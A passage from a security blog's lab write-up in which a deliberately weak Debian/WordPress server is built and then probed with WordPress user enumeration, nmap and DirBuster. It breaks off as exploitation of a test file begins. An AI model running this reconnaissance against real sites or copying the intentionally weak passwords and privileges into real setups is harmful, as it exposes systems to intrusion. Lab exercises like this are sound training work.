<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Real Gs move in silence like lasagna - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="This article talks about setting up an infrastructure in order to attack it and investigate on it. The main purpose is level up in red/blue team methodology."><meta property="og:title" content="Real Gs move in silence like lasagna"><meta property="og:description" content="This article talks about setting up an infrastructure in order to attack it and investigate on it. The main purpose is level up in red/blue team methodology."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/realgsmoveinsilencelikelasagna/"><meta property="og:image" content="/maki.bzh/realgsmoveinsilencelikelasagna/featured-image.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-12-27T21:57:40+08:00"><meta property="article:modified_time" content="2019-12-27T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/maki.bzh/realgsmoveinsilencelikelasagna/featured-image.png"><meta name=twitter:title content="Real Gs move in silence like lasagna"><meta name=twitter:description content="This article talks about setting up an infrastructure in order to attack it and investigate on it. The main purpose is level up in red/blue team methodology."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/realgsmoveinsilencelikelasagna/><link rel=prev href=maki.bzh/feedbackecsc2018/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Real Gs move in silence like lasagna","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/realgsmoveinsilencelikelasagna\/"},"image":[{"@type":"ImageObject","url":"\/maki.bzh\/realgsmoveinsilencelikelasagna\/featured-image.png","width":596,"height":238}],"genre":"posts","keywords":"methodology, blue team, red team, forensic, pentest, web, docker, ssrf, garfield","wordcount":12278,"url":"maki.bzh\/realgsmoveinsilencelikelasagna\/","datePublished":"2019-12-27T21:57:40+08:00","dateModified":"2019-12-27T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":"This article talks about setting up an infrastructure in order to attack it and investigate on it. The main purpose is level up in red/blue team methodology."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Real Gs move in silence like lasagna</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://www.maki.bzh title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Maki</a></span>&nbsp;<span class=post-category>included in <a href=maki.bzh/categories/posts/><i class="far fa-folder fa-fw" aria-hidden=true></i>Posts</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2019-12-27>2019-12-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;12278 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;58 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/maki.bzh/realgsmoveinsilencelikelasagna/featured-image.png data-srcset="/maki.bzh/realgsmoveinsilencelikelasagna/featured-image.png, /maki.bzh/realgsmoveinsilencelikelasagna/featured-image.png 1.5x, /maki.bzh/realgsmoveinsilencelikelasagna/featured-image.png 2x" data-sizes=auto alt=/maki.bzh/realgsmoveinsilencelikelasagna/featured-image.png title="This article talks about setting up an infrastructure in order to attack it and investigate on it. The main purpose is level up in red/blue team methodology."></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#fingerprinting>Fingerprinting</a><ul><li><a href=#wordpress>WordPress</a></li><li><a href=#nmap>Nmap</a></li><li><a href=#bruteforce>Bruteforce?</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#lfi-rce-or-ssrf>LFI, RCE or SSRF?</a></li><li><a href=#server-side-request-forgery>Server Side Request Forgery</a></li><li><a href=#ssrf-to-sql-injection>SSRF to SQL injection</a></li><li><a href=#offline-bruteforce>Offline bruteforce</a></li><li><a href=#rce-to-reverse-shell>RCE to reverse shell</a></li><li><a href=#from-www-data-to-odie>From www-data to odie</a></li><li><a href=#its-over>It&rsquo;s over&mldr;</a></li></ul></li><li><a href=#post-exploitation>Post exploitation</a><ul><li><a href=#pam-backdoor>PAM backdoor</a></li><li><a href=#cleaning-time>Cleaning time</a><ul><li><a href=#apache-logs>Apache logs</a></li><li><a href=#mysql-logs>MySQL logs</a></li><li><a href=#authentication-logs>Authentication logs</a></li><li><a href=#php-backdoor>PHP backdoor</a></li><li><a href=#users-history>Users history</a></li></ul></li></ul></li></ul><ul><li><a href=#forensic-environment>Forensic environment</a><ul><li><a href=#disk-extraction>Disk extraction</a></li><li><a href=#timeline>Timeline</a></li><li><a href=#memory-extraction>Memory extraction</a></li><li><a href=#volatility-profile>Volatility profile</a></li></ul></li><li><a href=#dfir-time>DFIR time</a><ul><li><a href=#malicious-connection>Malicious connection</a></li><li><a href=#entrypoint>Entrypoint</a></li><li><a href=#reverse-shell>Reverse shell</a></li><li><a href=#privilege-escalation>Privilege escalation</a><ul><li><a href=#www-data-to-odie>www-data to odie</a></li><li><a href=#odie-to-root>odie to root</a></li></ul></li></ul></li><li><a href=#attack-scenario>Attack scenario</a></li><li><a href=#action-plan>Action plan</a><ul><li><a href=#remediation>Remediation</a></li><li><a href=#improvement>Improvement</a></li></ul></li></ul><ul><li><a href=#ressources>Ressources</a></li></ul></nav></div></div><div class=content id=content><iframe width=560 height=315 src=https://www.youtube.com/embed/c7tOAGY59uQ frameborder=0 allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>In this article, I will introduce you to Odie&rsquo;s misfortunes. Odie is a final year student at ENSIBS Cyberdefense (France).
He is also the biggest fan of the famous band: Iron Maiden. In addition to that, he built a small fan website for them on his Virtual Private Server.
Given that, Odie is a poor student, he only owns one VPS for his tests, courses and others stuff.
But, Odie comes from the most prestigious school in cyberdefense, then he knows how to protect himself against awful hackers&mldr; Well, almost.</p><p>We will see how the Odie website got attacked and we will try to find some evidence about the attack in memory. This is what we will try to see together in this article.</p><p>First of all, I&rsquo;m not an expert whether in red or blue team, not at all. The goal of this little practical exercises is learning new things and try to improve my skill in pentest and incident response. If you got any comments, feel free to contact me! :D</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/lCy03imiDRmzC/giphy.gif data-srcset="https://media.giphy.com/media/lCy03imiDRmzC/giphy.gif, https://media.giphy.com/media/lCy03imiDRmzC/giphy.gif 1.5x, https://media.giphy.com/media/lCy03imiDRmzC/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/lCy03imiDRmzC/giphy.gif title=https://media.giphy.com/media/lCy03imiDRmzC/giphy.gif></p><p>Thanks to <a href=https://twitter.com/_SIben_ target=_blank rel="noopener noreffer">SIben</a> for helping me when I was trying to find a name for this article!</p><p><strong>UPDATE 1 XX/XX/XXXX</strong>: <a href=https://twitter.com/AZobec target=_blank rel="noopener noreffer">Arnaud ZOBEC</a> told me that I could have done a timeline of the attacked system before RAM dump extraction. In order to correlate file schedule.</p><p><strong>UPDATE 2 XX/XX/XXXX</strong>: <a href=https://twitter.com/FabianRODES target=_blank rel="noopener noreffer">Fabian RODES</a> advised me to detail a little more the &ldquo;Action plan&rdquo; part with:</p><ul><li>SSH configuration hardening</li><li>PHP configuration and Apache2 hardening (+ ModSecurity)</li><li>WordPress hardening (configuration + iTheme Security plugin)</li><li>Installing a reverse proxy and possibly blocking via geoip</li><li>Installing fail2ban on SSH and Apache2</li></ul><p><strong>UPDATE 3 XX/XX/XXXX</strong>: <a href=https://twitter.com/TheLaluka target=_blank rel="noopener noreffer">Laluka</a> told me it would be nice to add some stuff like the arbitrary PHP code.</p><h1 id=setting-up-the-environment>Setting up the environment</h1><p>Before attacking the server, here are its specifications:</p><ul><li>Debian 9</li><li>Apache2 server</li><li>MariaDB</li><li>PHP 7</li></ul><p>I will share with you the Linux commands that Odie made. Perhaps you will find his& choices interesting&mldr; Or not!</p><p>During Debian installation, Odie only installed SSH server. When the system is properly installed, Odie did updates/upgrades and put his user in <code>sudo</code> group, more convenient.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ su root 
</span></span><span class=line><span class=cl><span class=c1># apt update</span>
</span></span><span class=line><span class=cl><span class=c1># apt upgrade</span>
</span></span><span class=line><span class=cl><span class=c1># apt install sudo vim curl python python-pip</span>
</span></span><span class=line><span class=cl><span class=c1># usermod -aG sudo odie</span>
</span></span><span class=line><span class=cl><span class=c1># reboot</span>
</span></span></code></pre></td></tr></table></div></div><p>Now, comes the time to install and set up the web server, database and PHP for the future WordPress:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo apt install mariadb-client mariadb-server
</span></span><span class=line><span class=cl>$ sudo su
</span></span><span class=line><span class=cl><span class=c1># mysql_secure_installation</span>
</span></span><span class=line><span class=cl>MySQL root password: mysqlroot
</span></span><span class=line><span class=cl>Remove anonymous users: Y
</span></span><span class=line><span class=cl>Disallow root login remotely: Y
</span></span><span class=line><span class=cl>Remove <span class=nb>test</span> database and access to it: Y
</span></span><span class=line><span class=cl>Reload priv: Y
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># mysql</span>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; create database wp_db<span class=p>;</span>
</span></span><span class=line><span class=cl>Query OK, <span class=m>1</span> row affected <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; CREATE USER <span class=s1>&#39;wp_mysql_user&#39;</span>@<span class=s1>&#39;localhost&#39;</span> IDENTIFIED BY <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>Query OK, <span class=m>0</span> rows affected <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; GRANT ALL PRIVILEGES ON *.* to <span class=s1>&#39;wp_mysql_user&#39;</span>@<span class=s1>&#39;localhost&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>Query OK, <span class=m>0</span> rows affected <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; FLUSH PRIVILEGES<span class=p>;</span>
</span></span><span class=line><span class=cl>Query OK, <span class=m>0</span> rows affected <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; quit
</span></span><span class=line><span class=cl>Bye
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># sudo apt install php7.0 php7.0-mysql apache2 libapache2-mod-php7.0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;&lt;?php echo &#39;bite de poulet&#39;; ?&gt;&#34;</span> &gt; test.php
</span></span><span class=line><span class=cl>$ curl 127.0.0.1/test.php
</span></span><span class=line><span class=cl>bite de poulet
</span></span></code></pre></td></tr></table></div></div><p>As Odie has been computer science security courses, he takes great care to run <code>mysql_secure_installation</code> to set a password on MySQL <strong>root</strong> user, remove useless data, and disable remote connection for the <strong>root</strong> user.</p><p>In addition, he knows that it&rsquo;s a bad habit to work with the <strong>root</strong> user. Then he created a specific MySQL user for his WordPress: <strong>wp_mysql_user</strong>.</p><p>Talking about WordPress, Odie installed it like that:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>cd</span> /var/www/html 
</span></span><span class=line><span class=cl>$ wget https://wordpress.org/latest.tar.gz
</span></span><span class=line><span class=cl>$ file latest.tar.gz 
</span></span><span class=line><span class=cl>latest.tar.gz: gzip compressed data, last modified: Wed Dec <span class=m>19</span> 23:24:07 2018, from Unix
</span></span><span class=line><span class=cl>$ tar xvfz latest.tar.gz
</span></span><span class=line><span class=cl>$ mv wordpress/* .
</span></span><span class=line><span class=cl>$ sudo chown -R www-data:www-data /var/www/html
</span></span><span class=line><span class=cl>$ sudo find /var/www/html -type d -exec chmod <span class=m>755</span> <span class=o>{}</span> <span class=se>\;</span>
</span></span><span class=line><span class=cl>$ sudo find /var/www/html -type f -exec chmod <span class=m>644</span> <span class=o>{}</span> <span class=se>\;</span>
</span></span><span class=line><span class=cl>$ sudo rm index.html
</span></span></code></pre></td></tr></table></div></div><p>Rights are well assigned, we have <code>755</code> on all folders, <code>644</code> on files and the owner of everything in <code>/var/www/html</code> folder is <strong>www-data</strong>. Everything is going well!</p><p>After four clicks, the WordPress is finally installed. Odie doesn&rsquo;t like to bother too much, he didn&rsquo;t have his keepass with him so he put a temporary weak password for the admin account. He thought he is going to change it later.</p><p>Then, Odie installed <code>docker</code>. It&rsquo;s more convenient for little tests and setting up small architecture. Here is his configuration:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo apt-get install <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     apt-transport-https <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     ca-certificates <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     curl <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     gnupg2 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     software-properties-common
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ curl -fsSL https://download.docker.com/linux/debian/gpg <span class=p>|</span> sudo apt-key add -
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo add-apt-repository <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>   <span class=s2>&#34;deb [arch=amd64] https://download.docker.com/linux/debian \
</span></span></span><span class=line><span class=cl><span class=s2>   </span><span class=k>$(</span>lsb_release -cs<span class=k>)</span><span class=s2> \
</span></span></span><span class=line><span class=cl><span class=s2>   stable&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo apt-get update <span class=o>&amp;&amp;</span> sudo apt-get install docker-ce
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo usermod -aG docker odie
</span></span></code></pre></td></tr></table></div></div><p>Now that everything is installed, he decided to customize his website with a more rock&rsquo;n&rsquo;roll theme.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/env_1.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/env_1.png, /lib/images/articles/realgsmoveinsilencelikelasagna/env_1.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/env_1.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/env_1.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/env_1.png></p><p>After that, Odie go back to his business. He got some work to do for his school. Hurry! It&rsquo;s the last year, he shouldn&rsquo;t miss it!</p><h1 id=red-team-time>Red team time</h1><p>A few days/weeks have passed since Odie put his website online. A clever student from a competing school fell on Odie&rsquo;s website. This student knows that the site belongs to Odie. This little gangster wants to hack the website and steal all ENSIBS courses!</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/hZWCe6lD1oVTq/giphy.gif data-srcset="https://media.giphy.com/media/hZWCe6lD1oVTq/giphy.gif, https://media.giphy.com/media/hZWCe6lD1oVTq/giphy.gif 1.5x, https://media.giphy.com/media/hZWCe6lD1oVTq/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/hZWCe6lD1oVTq/giphy.gif title=https://media.giphy.com/media/hZWCe6lD1oVTq/giphy.gif></p><h2 id=fingerprinting>Fingerprinting</h2><p>This step will allow the attacker to get an accurate idea of the targeted information system. This will allow him to develop some advanced attacks against the server and get access or confidential data.</p><h3 id=wordpress>WordPress</h3><p>As the attacker, we know there is a website, a WordPress. There are some small interesting features on this kind of CMS, such as user enumeration:</p><blockquote><p>http://192.168.122.147/?author=1</p></blockquote><p>The above URL redirects us to:</p><blockquote><p>http://192.168.122.147/index.php/author/eddiethehead/</p></blockquote><p>We know the first user of this WordPress: <code>eddiethehead</code>.</p><p>Haax did a great article about &ldquo;vulnerabilities&rdquo; or dangerous features on WordPress, and he presents how to prevent them: <a href=https://haax.fr/en/articles/best-security-practice-wordpress-installation/ target=_blank rel="noopener noreffer">https://haax.fr/en/articles/best-security-practice-wordpress-installation/</a></p><p>At least, the WordPress is up to date. <code>Wappalyzer</code> is a Firefox plugins which display versions of solutions used in the visited website.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_1.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_1.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_1.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_1.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_1.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_1.png></p><h3 id=nmap>Nmap</h3><p>The next scan is not very stealthy, even not at all. It&rsquo;s red team but not too much red team&mldr; :')</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>host $ sudo nmap -p- -sS -sV -O -oA nmap 192.168.122.147
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-27 03:51 UTC
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.122.147
</span></span><span class=line><span class=cl>Host is up (0.00024s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.25 ((Debian))
</span></span><span class=line><span class=cl>MAC Address: 52:54:00:64:C8:8F (QEMU virtual NIC)
</span></span><span class=line><span class=cl>Device type: general purpose
</span></span><span class=line><span class=cl>Running: Linux 3.X|4.X
</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span></span><span class=line><span class=cl>OS details: Linux 3.2 - 4.9
</span></span><span class=line><span class=cl>Network Distance: 1 hop
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 8.67 seconds
</span></span></code></pre></td></tr></table></div></div><p>This scan will test all TCP ports of the machine (from 1 to 65535) and will try to determine the services and associated versions. Finally, I export these reports in gnmap, nmap and xml format.</p><p>Pro tip: to make easier large nmap scans reading:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host $ xsltproc nmap.xml &gt; nmap.html
</span></span></code></pre></td></tr></table></div></div><p>This tool will convert the XML file to an HTML file similar to:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_2.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_2.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_2.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_2.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_2.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_2.png></p><h3 id=bruteforce>Bruteforce?</h3><p>We could try to brute-force the SSH with <strong>eddiethehead</strong> or <strong>oddie</strong> as username, but that wouldn&rsquo;t be very discreet. So we&rsquo;re going to try something much more quiet: brute-force the files at the root with <code>DirBuster</code>.
Yes I know, it&rsquo;s not quiet, but well, I&rsquo;m sure Odie won&rsquo;t see his logs&mldr;. At least for the moment.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_3.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_3.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_3.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_3.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_3.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_3.png></p><p>We use 40 threads because, well, I have already generated logs, then let&rsquo;s continue in that way. I will use the &ldquo;medium&rdquo; wordlist provided with DirBuster, which never really disappointed me.</p><p>And finally, we will only look for PHP and text files in the root folder, without being recursive. If there are no new hypotheses at the end of this first brute force, then maybe I will dig deeper. But for the moment, there are no advantages in being recursive.</p><p>After only 8500 requests, a file got my attention: <code>test.php</code>. It is not a default WordPress file:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_4.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_4.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_4.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_4.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_4.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_4.png></p><p>Let&rsquo;s take a look at it:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_5.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_5.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_5.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_5.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_5.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_5.png></p><h2 id=exploitation>Exploitation</h2><p>A file checker, let&rsquo;s see what happens if I query for <code>maki.bzh</code> (totally random choice obviously :D).</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_6.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_6.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_6.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_6.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_6.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_6.png></p><p>We can only test local files. Let&rsquo;s try with the <code>index.php</code> file:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_7.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_7.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_7.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_7.png 2x" data-sizes=auto 